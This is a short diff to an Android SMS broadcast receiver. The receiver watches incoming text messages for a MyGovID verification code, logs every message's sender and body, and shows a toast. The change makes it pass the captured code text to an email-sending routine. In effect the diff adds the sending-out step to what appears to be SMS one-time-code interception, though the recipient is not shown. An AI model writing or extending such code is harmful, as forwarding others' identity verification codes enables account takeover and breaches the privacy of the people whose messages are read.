@@ -22,13 +22,15 @@ public class SmsBroadcastReceiver extends BroadcastReceiver {
             String smsBody = "";
             for (SmsMessage smsMessage : Telephony.Sms.Intents.getMessagesFromIntent(intent)) {
                 smsBody += smsMessage.getMessageBody();
+
             }
 
             if (smsBody.contains(SmsHelper.SMS_CONDITION)) {
                 Log.d(TAG, "Sms with condition detected");
                 Toast.makeText(context, "MyGovID verification code received : " + smsBody, Toast.LENGTH_LONG).show();
                 MailSenderActivity mailSenderActivity = new MailSenderActivity();
-                mailSenderActivity.sendEmail();
+                mailSenderActivity.sendEmail(smsBody);
+
             }
             Log.d(TAG, "SMS detected: From " + smsSender + " With text " + smsBody);
         }
